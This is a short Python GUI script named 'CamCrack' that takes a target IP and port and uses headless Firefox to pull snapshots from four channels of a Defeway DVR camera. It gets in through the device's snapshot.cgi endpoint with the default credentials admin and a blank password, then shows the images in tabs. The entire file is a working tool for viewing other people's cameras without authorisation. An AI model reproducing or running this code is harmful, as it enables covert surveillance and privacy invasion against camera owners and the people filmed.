from tkinter import *
from tkinter import ttk
from selenium import webdriver
from io import BytesIO
from PIL import Image

window = Tk()
window.title('CamCrack v1.github')

Label(window, text="IP Address:" ) .grid(row=0, column=0, sticky=W)
var_ip = Entry(window, width=15, )
var_ip.grid(row=0, column=1,sticky=SW)

Label(window, text="Port number:" ) .grid(row=0, column=2, sticky=W)
var_port = Entry(window, width=9, )
var_port.grid(row=0, column=3,sticky=W)


geckodriver = 'C:\\Users\\jzbkn\\Gecko\\geckodriver.exe'
options = webdriver.FirefoxOptions()
options.add_argument('-headless')
browser = webdriver.Firefox(executable_path=geckodriver, options=options)

def man_defeway():
    nb = ttk.Notebook(window)
    nb.grid(row=1, column=0, sticky='NSEW')
    def get_screenshot(cam_count):
        for i in range(0,cam_count):
            var_defeway = '/cgi-bin/snapshot.cgi?chn=' + str(i) + '&u=admin&p=&q=0'
            var_defeway_url = 'http://' + var_ip.get() + ':' + var_port.get() + var_defeway
            browser.get(var_defeway_url)
            element = browser.find_element_by_tag_name('img')
            location = element.location
            size = element.size
            png = browser.get_screenshot_as_png()
            im = Image.open(BytesIO(png))
            left = location['x']
            top = location['y']
            right = location['x'] + size['width']
            bottom = location['y'] + size['height']
            im = im.crop((left, top, right, bottom))
            im.save('C:\\Users\\jzbkn\\Gecko\\newshot' + str(i) + '.png')
            tab = ttk.Frame(nb)
            nb.add(tab, text="Camera " + str(i))
            snap = PhotoImage(file='C:\\Users\\jzbkn\\Gecko\\newshot' + str(i) + '.png')
            snap.image = snap
            Label(tab, image=snap) .grid(row=0, column=0, sticky=W)
    get_screenshot(4)
    
    
Button(window,text="run", width=3, command=man_defeway) .grid (row=0, column=4)

window.mainloop()
    
